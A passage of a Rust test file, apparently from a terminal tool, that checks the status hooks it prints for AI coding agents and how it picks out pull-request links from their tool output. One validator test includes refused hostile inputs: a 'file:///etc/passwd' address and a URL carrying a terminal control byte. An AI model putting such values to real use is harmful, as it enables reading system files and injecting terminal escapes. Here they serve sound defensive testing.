        // `a_codex_question_in_plan_mode_keeps_the_running_its_hooks_said`, in
        // the workspace's tests.
        let (codex, missing) = hooks("codex");
        assert!(codex.contains(&("PreToolUse", "running")), "{codex:?}");
        assert!(
            missing.contains("in Plan mode, in its question dialog, keeps the row running"),
            "{missing}"
        );

        let skill = SKILL.split_whitespace().collect::<Vec<_>>().join(" ");
        for said in [
            // Where the plugin is said to report all of it.
            "A question its model asks in its reply ends its turn, so it reads as `idle`; one it \
asks in Plan mode, in its question dialog, keeps the turn open, and the row says `running` until \
it is answered."
                .to_owned(),
            // And where a worker is waited on.
            "a question a Codex or Gemini CLI worker asks in its reply ends its turn, so it reads \
as `idle`, and `needs-input` never comes for it."
                .to_owned(),
            format!(
                "Gemini CLI can also ask in its `ask_user` dialog, which its hooks report as \
`needs-input` with \"{message}\", not the question"
            ),
            "Codex asks in a dialog only in Plan mode, and its hooks say `running` until it is \
answered"
                .to_owned(),
        ] {
            assert!(skill.contains(&said), "the skill no longer says: {said}");
        }
    }

    #[test]
    fn every_hook_printed_for_every_agent_is_guarded_and_names_no_binary() {
        // A hook that is the binary's path and nothing else fails whenever
        // the report does, and Copilot CLI refuses the tool call such a hook
        // was about: every tool of a run with no terminal, and of every run
        // anywhere once the path has gone.
        let binary = Path::new("/opt/crook/bin/crook");
        let mut checked = Vec::new();
        for agent in AGENTS {
            let (events, copilot) = match agent.fragment {
                Fragment::Hooks { events, .. } => (events, false),
                Fragment::Copilot { events, .. } => (events, true),
                Fragment::Plugin { .. } | Fragment::None(_) => continue,
            };
            let printed = hooks_text(agent.name, binary).unwrap().text;
            assert!(
                !printed.contains("/opt/crook"),
                "{} names the binary it was printed from: {printed}",
                agent.name
            );
            let parsed: Value = serde_json::from_str(&printed).unwrap();
            for (event, arguments) in events {
                let hook = &parsed["hooks"][event][0];
                let command = if copilot {
                    &hook["bash"]
                } else {
                    &hook["hooks"][0]["command"]
                };
                assert_eq!(
                    Some(hook_command(arguments).as_str()),
                    command.as_str(),
                    "{} {event}",
                    agent.name
                );
            }
            checked.push(agent.name);
        }
        assert_eq!(["claude", "codex", "gemini", "copilot"][..], checked);
    }

    #[test]
    fn the_help_says_which_printed_hooks_the_guard_covers() {
        // Only the command hooks carry the guard. OpenCode's plugin and
        // aider's command run the binary by its path wherever they are
        // loaded, so they reach the pane over ssh with nothing passed on, and
        // a --help that said every hook `--agent-hooks` prints did nothing
        // there sent a person to the server's sshd_config for no reason.
        // Guard one of those two and this fails, so the help changes with it.
        use crate::shell_integration::PANE_ID_VARIABLE;
        let binary = Path::new("/opt/crook/bin/crook");
        let mut guarded = Vec::new();
        for agent in AGENTS {
            match agent.fragment {
                Fragment::Hooks { .. } | Fragment::Copilot { .. } => {
                    guarded.push(format!("`{}`", agent.name));
                }
                Fragment::Plugin { .. } | Fragment::None(_) => {
                    let printed = hooks_text(agent.name, binary).unwrap().text;
                    assert!(
                        printed.contains("/opt/crook/bin/crook")
                            && !printed.contains("TERM_PROGRAM")
                            && !printed.contains(PANE_ID_VARIABLE),
                        "{} is no longer the bare path: {printed}",
                        agent.name
                    );
                }
            }
        }
        let help = crate::help_text()
            .split_whitespace()
            .collect::<Vec<_>>()
            .join(" ");
        for sentence in [
            format!(
                "The command hooks ({}) do nothing where none of TERM_PROGRAM=Crook, \
{PANE_ID_VARIABLE} and tmux's TMUX is set",
                guarded.join(", ")
            ),
            "the OpenCode plugin and aider's command name the binary by its path and have no \
such guard"
                .to_owned(),
        ] {
            assert!(
                help.contains(&sentence),
                "--help no longer says {sentence:?}"
            );
        }
    }

    /// Loads the OpenCode plugin from `CROOK_PLUGIN` under Node, hands it a
    /// stand-in for Bun's `$` and for the client of OpenCode's server, fires
    /// the events of the captures the rule was made from at it without
    /// waiting — as OpenCode fires them — and prints the commands it ran, in
    /// the order they finished, and the sessions it asked the server about.
    ///
    /// The stand-in shell runs a command when it is awaited, as Bun's does,
    /// and takes longer over each one than over the next, so reports started
    /// side by side would finish the other way round. The stand-in server
    /// knows four sessions: two made while the plugin listens, and two made
    /// before OpenCode was started again — the person's session it was
    /// resumed on, and a subagent's that `task` goes on in by its id, which
    /// makes no `session.created` (both ids from OpenCode 1.18.33, run with
    /// `-s` and a model that hands `task` the subagent's `task_id`).
    const OPENCODE_HARNESS: &str = r#"
const { CrookPlugin } = await import(
  "data:text/javascript;base64," + Buffer.from(process.env.CROOK_PLUGIN).toString("base64")
)
const ran = []
let takes = 120
const $ = (strings, ...values) => {
  const command = String.raw(strings, ...values)
  const wait = takes
  takes = Math.max(0, takes - 10)
  const shell = {
    quiet: () => shell,
    nothrow: () => shell,
    then: (resolve, reject) =>
      new Promise((done) => setTimeout(() => done(ran.push(command)), wait)).then(resolve, reject),
  }
  return shell
}
const root = "ses_ed0445216ffeDHYKPcyGysBHGl"
const child = "ses_ed0444d0fffeOBcKd0pB2EaB4b"
const resumed = "ses_ec3c39346ffe1eo7jBJqd3lolD"
const resumedChild = "ses_ec3c38bb2ffeh9OcicNu5iWh2T"
const parents = { [child]: root, [resumedChild]: resumed }
const asked = []
const client = {
  session: {
    get: ({ path: { id } }) => {
      asked.push(id)
      return new Promise((done) => setTimeout(() => done({ data: { id, parentID: parents[id] } }), 30))
    },
  },
}
const hooks = await CrookPlugin({ $, client })
const prompt = (sessionID, text, synthetic) =>
  hooks["chat.message"]({ sessionID }, { parts: [{ type: "text", text, synthetic }] })
const event = (type, properties) => hooks.event({ event: { type, properties } })
const busy = (sessionID) => event("session.status", { sessionID, status: { type: "busy" } })
const stopped = (sessionID) => event("session.status", { sessionID, status: { type: "idle" } })
const idle = (sessionID) => event("session.idle", { sessionID })
await Promise.all([
  event("session.created", { sessionID: root, info: { id: root } }),
  prompt(root, "please delegate the file"),
  busy(root),
  busy(root),
  event("session.created", { sessionID: child, info: { id: child, parentID: root } }),
  prompt(child, "run the subtask"),
  busy(child),
  event("permission.asked", { sessionID: child, permission: "bash", patterns: ["touch made-by-sub.txt"] }),
  event("permission.replied", { sessionID: child }),
  busy(child),
  stopped(child),
  idle(child),
  busy(root),
  stopped(root),
  idle(root),
  prompt(resumed, "do it again"),
  busy(resumed),
  prompt(resumedChild, "run the subtask"),
  busy(resumedChild),
  stopped(resumedChild),
  idle(resumedChild),
  busy(resumed),
  stopped(resumed),
  idle(resumed),
  prompt(resumed, `<task id="${resumedChild}" state="completed">\n<task_result>\ndone\n</task_result>\n</task>`, true),
  busy(resumed),
  stopped(resumed),
  idle(resumed),
])
process.stdout.write(JSON.stringify({ ran, asked }))
"#;

    #[test]
    fn the_opencode_plugin_reports_a_subagents_questions_and_nothing_else_of_it() {
        // The plugin is JavaScript, and what it does is only proven by
        // running it: Node rather than Bun, which OpenCode is, because Node
        // is on every machine the gate runs on and the plugin uses nothing
        // of Bun's but the `$` the harness stands in for.
        let plugin = hooks_text("opencode", Path::new("/opt/crook/bin/crook"))
            .unwrap()
            .text;
        let output = match crate::process::command("node")
            .args(["--input-type=module", "-e", OPENCODE_HARNESS])
            .env("CROOK_PLUGIN", &plugin)
            .output()
        {
            Ok(output) => output,
            Err(error) if error.kind() == io::ErrorKind::NotFound => {
                eprintln!("skipped: no node on PATH to run the OpenCode plugin under");
                return;
            }
            Err(error) => panic!("node could not be started: {error}"),
        };
        assert!(
            output.status.success(),
            "the harness failed: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        let printed: Value = serde_json::from_slice(&output.stdout).unwrap_or_else(|error| {
            panic!(
                "the harness printed {:?}: {error}",
                String::from_utf8_lossy(&output.stdout)
            )
        });
        // The parent's prompt names the work, and its busy, said again and
        // again, is said once. Of the subagent, its question and the going
        // on after it, and not its prompt, its busy or its idle. Then the
        // parent's idle — last, as it was fired, however long the reports
        // before it took. The same of a turn in a session made before, whose
        // subagent was made before too. And a background task's result,
        // handed to the session as a prompt OpenCode wrote, is the work going
        // on and not a name for it.
        assert_eq!(
            json!({
                "ran": [
                    "/opt/crook/bin/crook --agent running --title please delegate the file",
                    "/opt/crook/bin/crook --agent needs-input --message bash: touch made-by-sub.txt",
                    "/opt/crook/bin/crook --agent running",
                    "/opt/crook/bin/crook --agent idle",
                    "/opt/crook/bin/crook --agent running --title do it again",
                    "/opt/crook/bin/crook --agent idle",
                    "/opt/crook/bin/crook --agent running",
                    "/opt/crook/bin/crook --agent idle",
                ],
                // Asked about once each, and only the two made before: a
                // session seen made costs nothing.
                "asked": [
                    "ses_ec3c39346ffe1eo7jBJqd3lolD",
                    "ses_ec3c38bb2ffeh9OcicNu5iWh2T",
                ],
            }),
            printed
        );
    }

    #[test]
    fn an_agent_with_no_hooks_gets_a_sentence_rather_than_an_error() {
        let aider = hooks_text("aider", Path::new("/opt/crook/bin/crook")).unwrap();
        assert!(aider.text.contains("no hooks"));
        // What the person can do instead, spelled with the binary.
        assert!(
            aider
                .text
                .contains("--notifications-command \"'/opt/crook/bin/crook' --agent idle\"")
        );
        assert!(aider.text.contains("wrapper script"));
        assert_eq!(None, aider.note);
    }

    #[test]
    fn the_names_are_listed_the_way_an_error_lists_them() {
        assert_eq!(
            "claude, codex, gemini, copilot, opencode or aider",
            names_listed()
        );
    }

    #[test]
    fn every_status_the_hooks_emit_is_one_the_wire_reads() {
        // The hooks are string literals -- `--agent running`, `--agent idle`,
        // `--agent needs-input`. Each word has to be one `report` accepts, and
        // so one `AgentReport` names, or the hook an agent runs writes an
        // error to its own stdout and the tab never moves. Renaming a status is
        // a two-place edit; the other tests pin `needs-input` and `running` by
        // name, but `idle` on Stop and SessionEnd was checked by nothing, so a
        // rename could leave those hooks calling a word the wire rejects with
        // the gate still green. This ties every fragment's every word back to
        // the enum -- the JSON ones, the plugin, and aider's sentence alike,
        // by reading the word after each `--agent` in the printed text.
        for agent in AGENTS {
            let text = hooks_text(agent.name, Path::new("/usr/bin/crook"))
                .unwrap()
                .text;
            let word_after = |marker: &str| {
                text.match_indices(marker)
                    .map(|(at, found)| {
                        let rest = &text[at + found.len()..];
                        rest.split(|character: char| {
                            !character.is_ascii_lowercase() && character != '-'
                        })
                        .next()
                        .unwrap_or_default()
                    })
                    // The plugin's `--agent ${status}` is a placeholder; its
                    // word is in the `report(session, "...")` call that fills
                    // it, below.
                    .filter(|word| !word.is_empty())
                    .collect::<Vec<_>>()
            };
            // The first string in each of the plugin's `report(` calls, which
            // follows the session the report is from.
            let reported = text.match_indices("report(").filter_map(|(at, found)| {
                let line = text[at + found.len()..].lines().next()?;
                line.split('"').nth(1)
            });
            let statuses = [word_after("--agent "), reported.collect()].concat();
            assert!(!statuses.is_empty(), "{} runs no `--agent`", agent.name);
            for status in statuses {
                assert!(
                    AgentReport::parse(status).is_some(),
                    "{} reports {status:?}, which is not a status the wire reads",
                    agent.name
                );
            }
        }
        let claude = hooks_text("claude", Path::new("/usr/bin/crook")).unwrap();
        let parsed: Value = serde_json::from_str(&claude.text).unwrap();
        let hooks = parsed["hooks"].as_object().unwrap();
        assert_eq!(8, hooks.len(), "a hook was added or dropped: {hooks:?}");
    }

    #[test]
    fn an_agent_nobody_wrote_hooks_for_is_refused_with_the_names_that_have_them() {
        let error = hooks_text("cursor", Path::new("/usr/bin/crook")).unwrap_err();
        let message = error.to_string();
        assert!(message.contains("cursor"));
        for agent in AGENTS {
            assert!(message.contains(agent.name), "{message}");
        }
    }

    const PR: &str = "https://github.com/theguriev/crook/pull/398";

    /// A PostToolUse input as Claude Code hands one to a hook after a Bash
    /// call: the command under `tool_input`, the output under
    /// `tool_response` in an object of its own.
    fn claude_post_tool_use(command: &str, stdout: &str, stderr: &str) -> String {
        json!({
            "session_id": "abc123",
            "hook_event_name": "PostToolUse",
            "tool_name": "Bash",
            "tool_input": { "command": command, "description": "Open the pull request" },
            "tool_use_id": "toolu_01",
            "tool_response": {
                "stdout": stdout,
                "stderr": stderr,
                "interrupted": false,
                "isImage": false,
            },
        })
        .to_string()
    }

    #[test]
    fn the_pull_request_rides_beside_the_status_on_its_own_channel() {
        assert_eq!(
            format!("\x1b]6340;running\x07\x1b]6342;pr;{PR}\x07"),
            sequence(AgentReport::Running, None, None, Some(PR), None)
        );
        // Without one the report is exactly what it was.
        assert_eq!(
            "\x1b]6340;idle\x07",
            sequence(AgentReport::Idle, None, None, None, None)
        );
    }

    /// Claude Code 2.1.280's PermissionRequest for one Bash call, and the
    /// PostToolUse that followed the yes given in its own dialog: one call,
    /// from the probe recorded in `docs/answering.md` (C11).
    const ASKED: &str = include_str!("../tests/fixtures/asks/claude-2.1.280-bash.json");
    const RAN: &str = include_str!("../tests/fixtures/asks/claude-2.1.280-bash-posttooluse.json");
    /// A PostToolUseFailure, of another call (C15).
    const FAILED: &str =
        include_str!("../tests/fixtures/asks/claude-2.1.280-bash-posttoolusefailure.json");

    /// The fingerprint the window names the question in `input` by, the way
    /// it computes it: from what the permission hook asked it.
    fn fingerprint_the_window_holds(input: &str) -> String {
        let environment = ask::Environment {
            socket: Some(PathBuf::from("/run/crook/socket")),
            entrypoint: Some("cli".to_owned()),
            ..ask::Environment::default()
        };
        let question = ask::question(input.as_bytes(), &environment, || Some(1))
            .expect("the fixture is a question the hook asks");
        request::fingerprint(&question.asked.digest())
    }

    /// `input` with `key` set to `value`.
    fn with(input: &str, key: &str, value: Value) -> String {
        let mut hook: Value = serde_json::from_str(input).unwrap();
        hook[key] = value;
        hook.to_string()
    }

    #[test]
    fn the_fingerprint_matches_between_permission_request_and_post_tool_use() {
        // The gate the whole done stands on: the tool's input after it ran
        // is the request's, byte for byte, in what Claude Code hands over.
        let input_of = |fixture: &str| {
            let at = fixture.find(r#""tool_input":"#).unwrap();
            let rest = &fixture[at..];
            rest[..rest.find('}').unwrap() + 1].to_owned()
        };
        assert_eq!(input_of(ASKED), input_of(RAN));

        let held = fingerprint_the_window_holds(ASKED);
        let done = done_from_hook(RAN).expect("a Bash call that ran says it is done");
        assert_eq!(held, done.as_str());

        // A failed call is as done, with the fingerprint its own input makes.
        let failed = done_from_hook(FAILED).expect("a Bash call that failed is done too");
        let asked = with(FAILED, "hook_event_name", json!("PermissionRequest"));
        assert_eq!(fingerprint_the_window_holds(&asked), failed.as_str());
        assert_ne!(held, failed.as_str());
    }

    #[test]
    fn a_done_is_said_only_for_what_a_question_could_have_been_about() {
        assert!(done_from_hook(RAN).is_some());
        for refused in [
            // Not the hook after a tool.
            ASKED.to_owned(),
            with(RAN, "hook_event_name", json!("PreToolUse")),
            // Another tool, or none.
            with(RAN, "tool_name", json!("Write")),
            with(RAN, "tool_name", Value::Null),
            // A subagent's, which the window was never asked about.
            with(RAN, "agent_id", json!("ac87da6c09324f43e")),
            // A session the wire would not take, or none.
            with(RAN, "session_id", json!("two words")),
            with(RAN, "session_id", Value::Null),
            // An input the allowlist would not have asked about.
            with(
                RAN,
                "tool_input",
                json!({ "command": "touch probe-c9a", "sandbox": "off" }),
            ),
            with(RAN, "tool_input", json!({ "command": "" })),
            // And text that is not a hook's input at all.
            "https://github.com/o/r/pull/1".to_owned(),
        ] {
            assert_eq!(None, done_from_hook(&refused), "{refused}");
        }
        // A blank agent id is the main thread's, as the question reads it.
        assert!(done_from_hook(&with(RAN, "agent_id", json!(""))).is_some());
        // And the session is what makes it this question and no other.
        assert_ne!(
            done_from_hook(RAN),
            done_from_hook(&with(RAN, "session_id", json!("another")))
        );
    }

    #[test]
    fn an_interrupted_tool_says_its_done_and_no_running() {
        let interrupted = with(FAILED, "is_interrupt", json!(true));
        assert!(interrupted_a_tool(&interrupted));
        assert!(
            done_from_hook(&interrupted).is_some(),
            "it ran, so it was allowed"
        );
        assert!(!interrupted_a_tool(FAILED));
        assert!(!interrupted_a_tool(RAN));
        assert!(!interrupted_a_tool(&with(RAN, "is_interrupt", json!(true))));
        assert!(!interrupted_a_tool(&with(
            FAILED,
            "is_interrupt",
            json!("true")
        )));
    }

    #[test]
    fn every_status_hook_command_is_unchanged() {
        // Codex keeps a hash of every hook it was told to trust, and holds a
        // changed one back for review: a hook command is never changed, only
        // added. And an older binary reads every one of these as it always
        // has. Pinned whole, the guard and all, for every agent.
        let guard = "[ \"$TERM_PROGRAM\" = Crook ] || [ -n \"$CROOK_PANE_ID\" ] || [ -n \"$TMUX\" ] || exit 0; \
crook=$CROOK_BIN; [ -x \"$crook\" ] || crook=$(command -v crook) || exit 0; \"$crook\" --agent ";
        let pinned: &[(&str, &[(&str, &str)])] = &[
            (
                "claude",
                &[
                    ("UserPromptSubmit", "running --title -"),
                    ("PreToolUse", "running"),
                    ("PostToolUse", "running --pull-request -"),
                    ("PostToolUseFailure", "running --pull-request -"),
                    ("Notification", "needs-input --message -"),
                    ("Stop", "idle"),
                    ("StopFailure", "failed --message -"),
                    ("SessionEnd", "idle"),
                ],
            ),
            (
                "codex",
                &[
                    ("UserPromptSubmit", "running --title -"),
                    ("PreToolUse", "running"),
                    ("PostToolUse", "running --pull-request -"),
                    ("PermissionRequest", "needs-input --message -"),
                    ("Stop", "idle"),
                    ("SessionEnd", "idle"),
                ],
            ),
            (
                "gemini",
                &[
                    ("BeforeAgent", "running --title -"),
                    ("BeforeTool", "running"),
                    ("AfterTool", "running"),
                    ("Notification", "needs-input --message -"),
                    ("AfterAgent", "idle"),
                    ("SessionEnd", "idle"),
                ],
            ),
            (
                "copilot",
                &[
                    ("sessionStart", "running --title - --session-start -"),
                    ("userPromptSubmitted", "running --title - --session -"),
                    ("preToolUse", "running --session -"),
                    ("postToolUse", "running --session -"),
                    ("notification", "needs-input --message - --session -"),
                    ("agentStop", "idle --session -"),
                    ("sessionEnd", "idle --session -"),
                ],
            ),
        ];
        for (agent, events) in pinned {
            let printed = hooks_text(agent, Path::new("/usr/bin/crook")).unwrap();
            let parsed: Value = serde_json::from_str(&printed.text).unwrap();
            let hooks = parsed["hooks"].as_object().unwrap();
            assert_eq!(events.len(), hooks.len(), "{agent}: {hooks:?}");
            for (event, arguments) in *events {
                let hook = &hooks[*event][0];
                let command = hook["hooks"][0]["command"]
                    .as_str()
                    .or_else(|| hook["bash"].as_str())
                    .unwrap_or_else(|| panic!("{agent} has no {event} hook"));
                assert_eq!(
                    format!("{guard}{arguments} || exit 0"),
                    command,
                    "{agent} {event}"
                );
            }
        }
    }

    /// Copilot CLI's subagent in the capture the session rule was made from.
    const SUBAGENT: &str = "f2368c19-368c-461e-8976-2cfa5d93311c";

    #[test]
    fn a_session_rides_in_the_report_after_a_second_cut() {
        assert_eq!(
            format!("\x1b]6340;idle;;;{SUBAGENT}\x07"),
            sequence(
                AgentReport::Idle,
                None,
                None,
                None,
                Some(Session::Of(SUBAGENT))
            )
        );
        assert_eq!(
            format!("\x1b]6340;running;run the subtask;;;{SUBAGENT}\x07"),
            sequence(
                AgentReport::Running,
                Some("run the subtask"),
                None,
                None,
                Some(Session::Of(SUBAGENT))
            )
        );
        // A session that starts says so after it, behind one more cut.
        assert_eq!(
            format!("\x1b]6340;running;port the tab bar;;;{SUBAGENT};;start\x07"),
            sequence(
                AgentReport::Running,
                Some("port the tab bar"),
                None,
                None,
                Some(Session::Starts(SUBAGENT))
            )
        );
    }

    #[test]
    fn a_session_that_starts_is_named_by_the_prompt_that_started_it() {
        // Copilot CLI's `sessionStart`, as captured from 1.0.89: no `prompt`,
        // and the prompt the session started with under `initialPrompt`. Its
        // report hands the pane over, and brings back the title the prompt's
        // own report lost to the session that held the pane before.
        let input = format!(
            r#"{{"sessionId":"{SUBAGENT}","timestamp":1792011689914,"cwd":"/tmp/proj","source":"new","initialPrompt":"second prompt\nand more"}}"#
        );
        assert_eq!(Some("second prompt".to_owned()), title_from_hook(&input));
        assert_eq!(Some(SUBAGENT.to_owned()), session_from_hook(&input));
    }

    #[test]
    fn a_prompt_copilot_wrote_itself_names_nothing() {
        // Copilot CLI 1.0.89's `userPromptSubmitted` when a background
        // subagent finished, as captured: the parent's session, and a prompt
        // no person wrote. Its first line named the tab `<system_notification>`.
        let input = format!(
            r#"{{"sessionId":"{SUBAGENT}","timestamp":1792018608141,"cwd":"/tmp/proj","prompt":"<system_notification>\nAgent \"sub\" (task) has finished processing and is now idle.\n</system_notification>"}}"#
        );
        assert_eq!(None, title_from_hook(&input));
        assert_eq!(Some(SUBAGENT.to_owned()), session_from_hook(&input));
        // A person's prompt that only mentions one is still a name.
        assert_eq!(
            Some("why does <system_notification> show up".to_owned()),
            title_from_hook(r#"{"prompt": "why does <system_notification> show up"}"#)
        );
    }

    #[test]
    fn the_session_is_read_out_of_either_agents_hook_input() {
        // Copilot CLI spells it `sessionId`; Claude Code, Codex and Gemini CLI
        // `session_id`. Both are in the hooks' input as captured.
        assert_eq!(
            Some(SUBAGENT.to_owned()),
            session_from_hook(&format!(
                r#"{{"sessionId":"{SUBAGENT}","timestamp":1791802242871,"prompt":"run the subtask"}}"#
            ))
        );
        assert_eq!(
            Some("abc123".to_owned()),
            session_from_hook(r#"{"session_id": "abc123", "hook_event_name": "Stop"}"#)
        );
        // Nothing the wire would not take, and nothing from a line piped in:
        // the report then goes as reports went before there were sessions.
        for input in [
            r#"{"sessionId": "two words"}"#,
            r#"{"sessionId": 7}"#,
            r#"{"prompt": "fix it"}"#,
            "f2368c19",
            "",
        ] {
            assert_eq!(None, session_from_hook(input), "{input}");
        }
    }

    #[test]
    fn every_copilot_hook_says_which_session_it_is_from() {
        // A subagent's prompt and its stop come through the same hooks as
        // the parent's, and the session is the one thing that tells them
        // apart. A hook that left it off would be a report the pane takes
        // whoever made it.
        // `sessionStart`, which Copilot runs for no subagent, says its
        // session starts, and the pane goes over to it.
        let printed = hooks_text("copilot", Path::new("/opt/crook/bin/crook")).unwrap();
        let parsed: Value = serde_json::from_str(&printed.text).unwrap();
        let hooks = parsed["hooks"].as_object().unwrap();
        assert_eq!(COPILOT_EVENTS.len(), hooks.len());
        for (event, hook) in hooks {
            let command = hook[0]["bash"].as_str().unwrap();
            let session = if event == "sessionStart" {
                " --session-start - || exit 0"
            } else {
                " --session - || exit 0"
            };
            assert!(
                command.ends_with(session),
                "copilot's {event} runs {command}"
            );
        }
    }

    #[test]
    fn an_address_that_is_not_https_is_refused_before_anything_is_written() {
        // Refused, not dropped: a person who typed the flag wants to know
        // the row will not show it. Checked before the terminal is opened,
        // which is also why this test needs none.
        for refused in [
            "http://github.com/o/r/pull/1",
            "file:///etc/passwd",
            "https://github.com/o/r/pull/1\x07",
            "not a link",
        ] {
            let error = report("running", None, None, Some(refused), None)
                .expect_err("an address the wire refuses is an error")
                .to_string();
            assert!(error.contains("--pull-request"), "{error}");
            assert!(error.contains("https://"), "{error}");
        }
        assert_eq!(
            PR,
            given_pull_request(&format!("  {PR}\n")).expect("the ends are trimmed")
        );
    }

    #[test]
    fn the_hook_finds_the_address_gh_pr_create_printed() {
        let created = claude_post_tool_use(
            "git push -u origin HEAD && gh pr create --fill --base main",
            &format!("{PR}\n"),
            "Creating pull request for feat/x into main in theguriev/crook\n",
        );
        assert_eq!(Some(PR.to_owned()), pull_request_from_hook(&created));

        // Codex hands over the output the model saw, as one string.
        let codex = json!({
            "hook_event_name": "PostToolUse",
            "tool_name": "Bash",
            "tool_input": { "command": "gh pr create --title 'x' --body 'y'" },
            "tool_response": format!("Exit code: 0\nOutput:\n{PR}\n"),
        })
        .to_string();
        assert_eq!(Some(PR.to_owned()), pull_request_from_hook(&codex));

        // A pull request that already existed is still the branch's pull
        // request, and gh names it on stderr.
        let existed = claude_post_tool_use(
            "gh pr create --fill",
            "",
            &format!(
                "a pull request for branch \"x\" into branch \"main\" already exists:\n{PR}\n"
            ),
        );
        assert_eq!(Some(PR.to_owned()), pull_request_from_hook(&existed));

        // `gh pr new` is the same command, and a gh named by its path is gh.
        let aliased = claude_post_tool_use("/usr/bin/gh pr new -f", PR, "");
        assert_eq!(Some(PR.to_owned()), pull_request_from_hook(&aliased));

        // The repository named before or after `pr`, as an agent in a fork
        // writes it.
        for command in [
            "gh -R theguriev/crook pr create --fill",
            "gh --repo theguriev/crook pr create --fill",
            "gh --repo=theguriev/crook pr create --fill",
            "gh pr -R theguriev/crook create --fill",
        ] {
            let named = claude_post_tool_use(command, PR, "");
            assert_eq!(
                Some(PR.to_owned()),
                pull_request_from_hook(&named),
                "{command}"
            );
        }

        // A script with no JSON pipes gh's own output.
        assert_eq!(
            Some(PR.to_owned()),
            pull_request_from_hook(&format!("{PR}\n"))
        );
    }

    #[test]
    fn the_hook_says_nothing_without_a_new_pull_request_in_it() {
        // Every other command, including one that prints a pull request's
        // address without making one.
        for (command, stdout) in [
            ("cargo test", "test result: ok"),
            ("gh pr view 398 --json url -q .url", PR),
            ("gh pr list", &format!("398\tfeat\t{PR}")[..]),
            ("echo pr create", PR),
        ] {
            assert_eq!(
                None,
                pull_request_from_hook(&claude_post_tool_use(command, stdout, "")),
                "{command}"
            );
        }
        // `gh pr create` that failed, and printed no address.
        assert_eq!(
            None,
            pull_request_from_hook(&claude_post_tool_use(
                "gh pr create --fill",
                "",
                "pull request create failed: GraphQL: No commits between main and x\n",
            ))
        );
        // `git push` in the same command prints GitHub's offer to make one,
        // which is an address and not a pull request.
        assert_eq!(
            None,
            pull_request_from_hook(&claude_post_tool_use(
                "git push -u origin x && gh pr create --fill",
                "",
                "remote: Create a pull request for 'x' on GitHub by visiting:\nremote:      https://github.com/o/r/pull/new/x\n",
            ))
        );
        // A hook input for something that is not a tool at all.
        assert_eq!(None, pull_request_from_hook(r#"{"prompt": "open a PR"}"#));
        assert_eq!(None, pull_request_from_hook(""));
        // And a piped line that holds no https address.
        assert_eq!(
            None,
            pull_request_from_hook("http://github.com/o/r/pull/1\n")
        );
    }

    #[test]
    fn a_hook_input_that_does_not_parse_is_not_read_as_piped_text() {
        // An output cut in the middle of an emoji leaves half a surrogate
        // pair, which JSON can escape and serde will not read. Taken as piped
        // text, the last https word in it — a link any tool printed, braces
        // and all — would become the pull request with no `gh pr create` in
        // sight.
        let cut = r#"{"hook_event_name":"PostToolUse","tool_name":"Bash","tool_input":{"command":"cargo test"},"tool_response":{"stdout":"see https://docs.rs/x \ud83d"}}"#;
        assert!(serde_json::from_str::<Value>(cut).is_err(), "serde read it");
        assert_eq!(None, pull_request_from_hook(cut));

        // Nor with the command and a pull request's address in it: the
        // input cannot be read, so neither can be trusted to be what it
        // looks like.
        let created = format!(
            r#"{{"tool_input":{{"command":"gh pr create --fill"}},"tool_response":{{"stdout":"{PR}\n\ud83d"}}}}"#
        );
        assert!(serde_json::from_str::<Value>(&created).is_err());
        assert_eq!(None, pull_request_from_hook(&created));
        assert_eq!(None, pull_request_from_hook(&format!("  {{ {PR}")));

        // Piped text is still piped text.
        assert_eq!(
            Some(PR.to_owned()),
            pull_request_from_hook(&format!("Creating pull request\n{PR}\n"))
        );
    }

    #[test]
    fn the_hooks_look_for_a_pull_request_after_every_tool() {
        // One hook after each tool, as there always was, now handed the
        // tool's input on stdin: a second hook on Bash alone would be a
        // second process for every command the agent runs.
        for agent in ["claude", "codex"] {
            let printed = hooks_text(agent, Path::new("/usr/bin/crook")).unwrap();
            let parsed: Value = serde_json::from_str(&printed.text).unwrap();
            assert_eq!(
                hook_command("running --pull-request -"),
                parsed["hooks"]["PostToolUse"][0]["hooks"][0]["command"]
                    .as_str()
                    .unwrap(),
                "{agent}"
            );
        }
    }

    /// The Claude Code plugin's hooks, as the repository ships them.
    const PLUGIN_HOOKS: &str = include_str!("../../packaging/claude-code/hooks/hooks.json");

    /// The plugin's copy of the skill.
    const PLUGIN_SKILL: &str = include_str!("../../packaging/claude-code/skills/crook/SKILL.md");

    /// The plugin's own manifest.
    const PLUGIN_MANIFEST: &str =
        include_str!("../../packaging/claude-code/.claude-plugin/plugin.json");

    /// The marketplace the repository is, which lists the plugin.
    const MARKETPLACE: &str = include_str!("../../.claude-plugin/marketplace.json");

    /// One agent the plugin serves, and the two files of it that are that
    /// agent's.
    struct Served {
        /// The agent, by its name in [`AGENTS`].
        agent: &'static str,
        /// The manifest it reads in the plugin's directory.
        manifest: &'static str,
        /// The hooks file the manifest names, as it names it, or `None` for
        /// one that names none and so is read with `hooks/hooks.json`.
        names: Option<&'static str>,
        /// That hooks file, where the repository keeps it.
        path: &'static str,
        /// And what is in it.
        hooks: &'static str,
    }

    /// Every agent the plugin serves. Codex CLI and Copilot CLI each read a
    /// manifest of their own before Claude Code's, and it names a hooks
    /// file of their own: without one, both run Claude Code's
    /// `hooks/hooks.json` under its names, which Codex reads with no
    /// `Notification` and so never says it stopped for an approval, and
    /// Copilot runs with no `--session`, so its subagents would rename the
    /// tab.
    const SERVED: [Served; 3] = [
        Served {
            agent: "claude",
            manifest: PLUGIN_MANIFEST,
            names: None,
            path: "packaging/claude-code/hooks/hooks.json",
            hooks: PLUGIN_HOOKS,
        },
        Served {
            agent: "codex",
            manifest: include_str!("../../packaging/claude-code/.codex-plugin/plugin.json"),
            names: Some("./hooks/codex.json"),
            path: "packaging/claude-code/hooks/codex.json",
            hooks: include_str!("../../packaging/claude-code/hooks/codex.json"),
        },
        Served {
            agent: "copilot",
            manifest: include_str!("../../packaging/claude-code/.github/plugin/plugin.json"),
            names: Some("./hooks/copilot.json"),
            path: "packaging/claude-code/hooks/copilot.json",
            hooks: include_str!("../../packaging/claude-code/hooks/copilot.json"),
        },
    ];

    #[test]
    fn the_plugin_hooks_are_the_printed_hooks() {
        // The plugin is a second copy of what `--agent-hooks` prints for each
        // agent it serves, in files the agents read and Rust does not, so
        // nothing but this keeps the two saying the same thing: an event
        // added to a table and not its file would be a status the plugin
        // never reports, and a guard changed in one and not the other a way
        // to fail an agent. Each command is then a `hook_command`, whose
        // guard the test below runs under `sh`, and `claude_code_hooks.rs`
        // runs what every agent's `--agent-hooks` prints against the real
        // binary.
        for served in SERVED {
            let shipped: Value = serde_json::from_str(served.hooks)
